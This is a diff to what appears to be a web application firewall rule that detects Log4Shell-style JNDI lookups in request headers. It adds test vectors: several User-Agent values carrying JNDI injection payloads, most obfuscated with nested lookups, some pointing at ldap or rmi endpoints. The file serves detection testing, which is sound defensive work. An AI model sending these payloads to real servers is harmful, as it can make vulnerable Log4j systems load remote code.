@@ -15,3 +15,19 @@ conditions:
       regex: \${[^j]*j[^n]*n[^d]*d[^i]*i[^:]*:[^}]*}
     operator: match_regex
 transformers: []
+test_vectors:
+  matches:
+    - server.request.headers.no_cookies/user-agent:${jndi:ldap}
+    - server.request.headers.no_cookies/user-agent:${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}
+    - server.request.headers.no_cookies/user-agent:${${::-j}ndi:rmi://127.0.0.1:1389/ass}
+    - server.request.headers.no_cookies/user-agent:${jndi:rmi://a.b.c}
+    - server.request.headers.no_cookies/user-agent:${${lower:jndi}:${lower:rmi}://q.w.e/poc}
+    - server.request.headers.no_cookies/user-agent:${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}
+    - server.request.headers.no_cookies/user-agent:${${lower:${lower:j}}${lower:${lower:n}}${lower:${::-d}}${lower:${lower:i}}:ldap}
+    - server.request.headers.no_cookies/user-agent:${${env:ENV_NAME:-j}n${env:ENV_NAME:-d}i${env:ENV_NAME:-:}${env:ENV_NAME:-l}d${env:ENV_NAME:-a}p${env:ENV_NAME:-:}
+    - server.request.headers.no_cookies/user-agent:${j${::-nD}i${::-:}:}
+    - server.request.headers.no_cookies/user-agent:${j${k8s:k5:-ND}i${sd:k5:-:}}
+    - server.request.headers.no_cookies/user-agent:${j${sys:k5:-nD}${lower:i${web:k5:-:}}:}
+    - server.request.headers.no_cookies/user-agent:${j${main:\\k5:-Nd}i${spring:k5:-:}}
+    - server.request.headers.no_cookies/user-agent:${j${EnV:K5:-nD}i:}
+    - server.request.headers.no_cookies/user-agent:${jn${date:}di${date:':'}}
